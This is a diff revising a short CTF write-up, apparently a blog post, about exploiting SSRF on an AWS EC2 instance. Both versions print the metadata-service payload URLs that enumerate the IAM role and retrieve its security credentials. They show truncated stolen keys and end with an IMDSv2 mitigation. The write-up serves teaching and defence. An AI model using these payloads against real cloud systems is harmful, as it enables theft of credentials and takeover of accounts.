@@ -1,49 +1,38 @@
 ---
-title: "AWS EC2 Exploitation: Stealing IAM Credentials"
+title: AWS SSRF Exploitation
 date: 2025-12-27 12:00:00 +0200
-categories: [Cloud Security, AWS]
-tags: [ctf, ssrf, aws, ec2, red-teaming]
+categories: [Cloud, Security]
+tags: [aws, ssrf, ctf]
 ---
 
 ## Introduction
 
-Server-Side Request Forgery (SSRF) is a critical vulnerability. In this write-up, I exploit an SSRF on AWS EC2 to access the **Instance Metadata Service**.
+In this challenge, I exploited an SSRF vulnerability on an AWS EC2 instance to steal IAM credentials.
 
-## Phase 1: Reconnaissance
+## Step 1: Finding the Vulnerability
 
-I found a URL input and tested it with the AWS Magic IP.
+I found a web app taking a URL input. I tested it with the AWS metadata IP.
+The payload used was: `http://169.254.169.254/latest/meta-data/`
 
-**Payload Used:**
-`http://169.254.169.254/latest/meta-data/`
+It worked! The server returned the directory listing.
 
-The server responded with the directory listing, confirming **IMDSv1**.
+## Step 2: Stealing the Keys
 
-## Phase 2: Exploitation
+To get the sensitive data, I targeted the IAM security credentials endpoint.
 
-### 1. Get Instance ID
-I requested this URL:
-`http://169.254.169.254/latest/meta-data/instance-id`
+1. First, I got the role name: ec2-prod-role
+2. Then, I requested the keys using this link:
 
-### 2. Steal IAM Credentials
-I enumerated the role name first:
-`http://169.254.169.254/latest/meta-data/iam/security-credentials/`
+`http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-prod-role`
 
-**Role Name:** `ec2-prod-role`
+## Result
 
-Then I extracted the keys using this final payload:
+The server responded with the Access Key and Secret Key.
 
-```text
-[http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-prod-role](http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-prod-role)
-Phase 3: Exfiltration
-Response containing the keys:
+Code: Success
+AccessKeyId: ASIAQ3EGUZ...
+SecretAccessKey: EBvAKCmU...
 
+## Fix
 
-{
-  "Code" : "Success",
-  "AccessKeyId" : "ASIAQ3EGUZ...",
-  "SecretAccessKey" : "EBvAKCmU..."
-}
-Mitigation
-Enforce IMDSv2.
-
-Whitelist allowed domains.
+Enable IMDSv2 on your EC2 instances to prevent this attack.
